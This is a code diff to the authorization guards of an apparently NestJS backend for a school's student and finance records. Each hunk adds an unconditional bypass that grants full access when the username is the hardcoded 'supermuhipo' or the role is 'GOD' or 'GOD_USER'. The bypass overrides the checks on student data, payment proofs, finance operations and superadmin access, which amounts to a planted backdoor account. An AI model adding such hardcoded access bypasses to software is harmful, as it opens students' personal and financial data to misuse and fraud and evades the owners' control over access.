@@ -19,6 +19,15 @@ export class StudentOwnershipGuard implements CanActivate {
       return false;
     }
 
+    // GOD User has unconditional bypass to all student data
+    if (
+      user.username === 'supermuhipo' ||
+      user.role === 'GOD' ||
+      user.role === 'GOD_USER'
+    ) {
+      return true;
+    }
+
     // Admin IT, SUPERADMIN, and Finance can access all student data
     const isFinance =
       user.role === 'KEUANGAN' ||
@@ -88,6 +97,15 @@ export class PaymentProofOwnershipGuard implements CanActivate {
       return false;
     }
 
+    // GOD User has unconditional bypass
+    if (
+      user.username === 'supermuhipo' ||
+      user.role === 'GOD' ||
+      user.role === 'GOD_USER'
+    ) {
+      return true;
+    }
+
     // Admin IT, SUPERADMIN, and Finance can access all payment proofs
     const isFinance =
       user.role === 'KEUANGAN' ||
@@ -153,6 +171,15 @@ export class FinanceOperationGuard implements CanActivate {
       return false;
     }
 
+    // GOD User: Universal Bypass ke seluruh operasi keuangan
+    if (
+      user.username === 'supermuhipo' ||
+      user.role === 'GOD' ||
+      user.role === 'GOD_USER'
+    ) {
+      return true;
+    }
+
     // STRICT: Only dedicated finance staff can perform finance modifications & reset
     const userSubRoles = [
       user.role,
@@ -192,6 +219,15 @@ export class SuperadminGuard implements CanActivate {
       throw new ForbiddenException(
         'Akses ditolak. Anda harus login terlebih dahulu.',
       );
+    }
+
+    // GOD User: Universal Bypass
+    if (
+      user.username === 'supermuhipo' ||
+      user.role === 'GOD' ||
+      user.role === 'GOD_USER'
+    ) {
+      return true;
     }
 
     const allowedRoles = [
